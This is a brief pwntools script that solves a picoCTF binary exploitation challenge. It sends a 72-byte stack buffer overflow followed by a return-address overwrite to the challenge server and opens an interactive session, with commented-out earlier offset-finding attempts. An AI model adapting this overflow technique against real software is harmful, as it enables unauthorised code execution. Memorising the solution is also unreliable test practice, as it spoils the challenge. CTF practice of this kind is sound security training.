from pwn import *

context(arch = "amd64", os="linux", endian="little")

p = remote("saturn.picoctf.net", 63716)

#payload = b'A' * 112
#payload += p32(0x08049296)
#payload += p32(0)
#payload += p32(0xcafef00d)
#payload += p32(0xf00df00d)
payload = b'A' * 72
#payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa'
#payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala'
payload += p64(0x000000000040123b)
#fd = open("payload", "wb")
#fd.write(payload)
#fd.close()

p.sendline(payload)
p.recvline()
p.interactive()
